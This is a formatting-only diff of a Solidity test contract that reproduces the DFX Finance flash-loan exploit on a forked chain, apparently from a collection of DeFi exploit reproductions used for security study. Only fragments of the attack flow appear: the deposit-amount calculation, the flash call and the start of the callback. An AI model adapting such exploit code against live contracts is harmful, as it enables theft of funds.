@@ -34,7 +34,7 @@ contract Exploit_DFXFinance is TestHarness {
     // balance.
     function setUp() external {
         cheat.createSelectFork(vm.envString("RPC_URL"), 15_941_703); // We pin one block before the exploit
-            // happened.
+        // happened.
 
         // We simulate some balance in this contract
         writeTokenBalance(address(this), address(usdc), usdc.balanceOf(attackerContract));
@@ -61,8 +61,7 @@ contract Exploit_DFXFinance is TestHarness {
         uint256 balanceBefore = address(this).balance;
 
         // Get the amount of USDC required for the attack.
-        ( /* uint256 curvesInExchange */ , uint256[] memory amountPerToken) =
-            dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
+        (/* uint256 curvesInExchange */, uint256[] memory amountPerToken) = dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
         uint256 amount0 = amountPerToken[0] * 994 / 1000; // From tx trace
         uint256 amount1 = amountPerToken[1] * 994 / 1000; // From tx trace
 
@@ -90,7 +89,15 @@ contract Exploit_DFXFinance is TestHarness {
         dfx.flash(address(this), amt0, amt1, new bytes(0));
     }
 
-    function flashCallback(uint256, /* _fee0 */ uint256, /* _fee1 */ bytes memory /* data */ ) external {
+    function flashCallback(
+        uint256,
+        /* _fee0 */
+        uint256,
+        /* _fee1 */
+        bytes memory /* data */
+    )
+        external
+    {
         require(msg.sender == address(dfx), "Only callable by DFX");
 
         console.log("------- STEP II: INSIDE DFX FLASHLOAN CALLBACK -------");
